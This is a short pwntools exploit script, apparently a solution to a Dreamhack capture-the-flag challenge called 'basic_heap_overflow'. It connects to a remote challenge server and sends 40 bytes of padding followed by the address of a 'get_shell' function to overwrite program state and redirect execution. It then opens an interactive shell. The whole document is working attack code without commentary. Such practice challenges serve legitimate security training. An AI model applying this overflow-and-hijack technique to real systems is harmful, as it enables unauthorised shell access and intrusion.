from pwn import *

context.binary = exe = ELF('./basic_heap_overflow',checksec=False)

r = remote('host3.dreamhack.games',18362)
#p = process(exe.path)

payload = b'a'*40 + p32(exe.sym['get_shell'])

r.sendline(payload)

r.interactive()